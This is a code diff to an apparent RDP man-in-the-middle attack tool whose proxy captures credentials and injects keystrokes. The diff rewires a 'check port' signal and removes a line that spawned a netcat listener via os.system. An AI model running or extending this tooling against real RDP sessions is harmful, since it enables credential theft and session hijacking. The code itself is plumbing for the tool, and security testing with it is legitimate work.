@@ -16,7 +16,7 @@ import seth.consts as consts
 class RDPProxy(threading.Thread):
     """Represents the RDP Proxy"""
 
-    def __init__(self, local_conn, remote_socket):
+    def __init__(self, local_conn, remote_socket, check_conn):
         super(RDPProxy, self).__init__()
         self.cancelled = False
         self.lsock = local_conn
@@ -24,6 +24,7 @@ class RDPProxy(threading.Thread):
         self.vars = {}
         self.injection_key_count = -100
         self.keyinjection_started = False
+        self.check_conn = check_conn
 
         #  self.relay_proxy = None
         #  if args.relay: # TODO
@@ -50,7 +51,7 @@ class RDPProxy(threading.Thread):
             except (ConnectionResetError, OSError) as e:
                 print("Connection lost (%s)" % str(e))
                 if "creds" in self.vars:
-                    stop_attack()
+                    stop_attack(self.check_conn)
 
 
     def run_fake_server(self):
@@ -86,7 +87,7 @@ class RDPProxy(threading.Thread):
             self.lsock.send(unhexlify(b"0300000f02f0803e00000803%02x03%02x" %
                                       (id, id)))
         self.close()
-        stop_attack()
+        stop_attack(self.check_conn)
 
 
     def cancel(self):
@@ -229,6 +230,15 @@ def read_data(sock):
 
 
 def open_sockets(port):
+    check_socket.bind((args.bind_ip, args.check_port))
+    check_socket.listen()
+
+    print("Listen for check socket")
+    check_conn, addr = check_socket.accept()
+    
+    print("Check Connection received from %s:%d" % addr)
+    check_conn = check_conn
+    
     local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     local_socket.bind((args.bind_ip, args.listen_port))
@@ -243,8 +253,8 @@ def open_sockets(port):
     if not args.fake_server:
         remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         remote_socket.connect((args.target_host, port))
-
-    return local_conn, remote_socket
+        
+    return local_conn, remote_socket, check_conn
 
 
 def get_ssl_version(sock):
@@ -274,9 +284,9 @@ def get_ssl_version(sock):
 #      )
 
 
-def stop_attack():
-    if args.check_port:
-        os.system("nc -lp %d &" % args.check_port)
+def stop_attack(check_conn):
+    if args.check_port and check_conn:
+        check_conn.close()
     os._exit(0)
 
 
@@ -339,7 +349,7 @@ def convert_str_to_scancodes(string):
 def run():
     try:
         while True:
-            lsock, rsock = open_sockets(args.target_port)
-            RDPProxy(lsock, rsock).start()
+            lsock, rsock, check_conn = open_sockets(args.target_port)
+            RDPProxy(lsock, rsock, check_conn).start()
     except KeyboardInterrupt:
         pass
